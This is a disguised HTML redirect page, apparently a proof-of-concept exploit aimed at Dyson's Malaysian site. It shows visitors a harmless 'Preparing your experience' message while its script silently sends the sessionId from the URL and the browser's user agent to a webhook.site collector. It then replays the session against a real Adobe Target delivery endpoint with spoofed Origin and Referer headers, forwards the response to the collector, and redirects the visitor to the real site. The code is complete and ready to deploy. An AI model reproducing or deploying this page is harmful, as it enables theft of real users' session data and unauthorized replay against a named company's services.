<!DOCTYPE html>
<html>
<head>
  <title>Redirecting...</title>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f9fafb;
      color: #333;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .status {
      text-align: center;
    }
  </style>
</head>
<body>
  <div class="status">
    <h2>Preparing your experience...</h2>
    <p>Please wait...</p>
  </div>

  <script>
    const sessionId = new URLSearchParams(window.location.search).get("sessionId");
    const webhook = "https://webhook.site/a2cf25f1-cb51-4ea9-9510-e885e4495fdc";

    if (sessionId) {
      // Silent Leak via image (CORS bypass)
      const img = new Image();
      img.src = `${webhook}?leak=${encodeURIComponent(sessionId)}&ua=${encodeURIComponent(navigator.userAgent)}`;
      document.body.appendChild(img);

      // Replay attempt
      fetch(`https://dyson.tt.omtrdc.net/rest/v1/delivery?client=dyson&sessionId=${sessionId}&version=2.10.0`, {
        method: "POST",
        headers: {
          "Content-Type": "text/plain",
          "Origin": "https://www.dyson.my",
          "Referer": "https://www.dyson.my"
        },
        body: JSON.stringify({
          requestId: "exploit-poc",
          context: { channel: "web" }
        })
      })
      .then(r => r.json())
      .then(data => {
        // Send response data to webhook
        fetch(webhook, {
          method: "POST",
          mode: "no-cors",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ sessionId, data, ua: navigator.userAgent })
        });
      })
      .catch(() => {});

      // Redirect after 2 sec
      setTimeout(() => {
        window.location.href = "https://www.dyson.my";
      }, 2000);
    } else {
      document.querySelector(".status").innerHTML = "<p style='color:red'>Missing sessionId in URL.</p>";
    }
  </script>
</body>
</html>
